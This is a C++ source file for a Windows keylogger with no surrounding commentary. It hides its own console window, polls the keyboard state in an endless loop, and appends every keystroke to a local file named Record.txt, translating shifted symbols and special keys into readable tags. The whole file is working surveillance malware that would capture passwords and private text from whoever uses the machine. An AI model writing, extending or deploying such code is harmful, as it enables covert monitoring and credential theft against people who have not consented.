

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void HideConsole();
int main() {
	HideConsole();
	Sleep(0);
	char key;

	for (;;)
	{
		for (key=8; key<=222 ; key++)
		{
			if(GetAsyncKeyState(key) == -32767)
			{
				ofstream write ("Record.txt", ios::app);

				if ( ((key>64) && (key<91) )&& (!(GetAsyncKeyState(0x10)) ) )
				{
					key+=32;
					write << key;
					write.close();
					break;
				}
				else if ( (key>64) && (key<91) )
				{
					write << key;
					write.close();
					break;
				}
				else
				{
					switch(key)
					{
					case 49:
						if (GetAsyncKeyState(0x10))
							write << "!";
						else
							write <<"1";
						break;
					case 50:
						if(GetAsyncKeyState(0x10))
							write << "@";
						else
							write <<"2";
						break;
					case 51:
						if(GetAsyncKeyState(0x10))
							write <<"#";
						else
							write <<"3";
						break;
					case 52:
						if(GetAsyncKeyState(0x10))
							write << "$";
						else
							write <<"4";
						break;
					case 53:
						if(GetAsyncKeyState(0x10))
							write << "%";
						else
							write <<"5";
						break;
					case 54:
						if (GetAsyncKeyState(0x10))
							write <<"^";
						else
							write <<"6";
						break;
					case 55:
						if(GetAsyncKeyState(0x10))
							write << "&";
						else
							write <<"7";
						break;
					case 56:
						if (GetAsyncKeyState(0x10))
							write <<"*";
						else
							write <<"8";
						break;
					case 57 :
						if (GetAsyncKeyState(0x10))
							write <<"(";
						else
							write <<"9";
						break;
					case 48:
						if(GetAsyncKeyState(0x10))
							write <<")";
						else
							write <<"9";
						break;
					case VK_SPACE :
						write <<" ";
						break;
					case VK_RETURN :
						write <<"\n";
						break;
					case VK_TAB:
						write <<"<Tab>";
						break;
					case VK_BACK:
						write <<"<BackSpace>";
						break;
					case VK_SHIFT:
						write <<"<Shift>";
						break;
					case VK_CONTROL:
						write <<"<Ctrl>";
						break;
					case VK_MENU:
						write <<"<Alt>";
						break;
					case VK_CAPITAL:
						write <<"<CapsLock>";
						break;
					case VK_ESCAPE:
						write <<"<Esc";
						break;
					case VK_LEFT:
						write <<"<LeftArrow>";
						break;
					case VK_UP:
						write <<"<UpArrow>";
						break;
					case VK_RIGHT:
						write <<"<RightArrow>";
						break;
					case VK_DOWN:
						write <<"<DownArrow>";
						break;
					case VK_DELETE:
						write <<"<Del>";
						break;
					case VK_SNAPSHOT:
						write <<"<Print ScreanShot>";
						break;
					case VK_LWIN:
						write <<"<Left WinKey>";
						break;
					case VK_RWIN:
						write <<"<Right WinKey>";
						break;
					case VK_APPS :
						write <<"<App Menu Key>";
						break;
					case VK_SLEEP:
						write <<"<SleepKey>";
						break;
					case VK_MULTIPLY:
						write <<"<MultiplyKey>";
						break;
					case VK_ADD:
						write <<"<AddKey>";
						break;
					case VK_SEPARATOR:
						write<<"|";
						break;
					case VK_DIVIDE:
						write <<"/";
						break;
					case VK_F1:
						write <<"<F1>";
						break;
					case VK_F2:
						write <<"<F2>";
						break;
					case VK_F3:
						write <<"<F3>";
						break;
					case VK_F4:
						write <<"<F4>";
						break;
					case VK_F5:
						write <<"<F5>";
						break;
					case VK_F6:
						write <<"<F6>";
						break;
					case VK_F7:
						write<<"<F7>";
						break;
					case VK_F8:
						write<<"<F8>";
						break;
					case VK_F9:
						write<<"<F9>";
						break;
					case VK_F10:
						write<<"<F10>";
						break;
					case VK_F11:
						write<<"<F11>";
						break;
					case VK_F12:
						write<<"<F12>";
						break;
					}
				}

			}
		}
	}
	return 0;
}

void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}


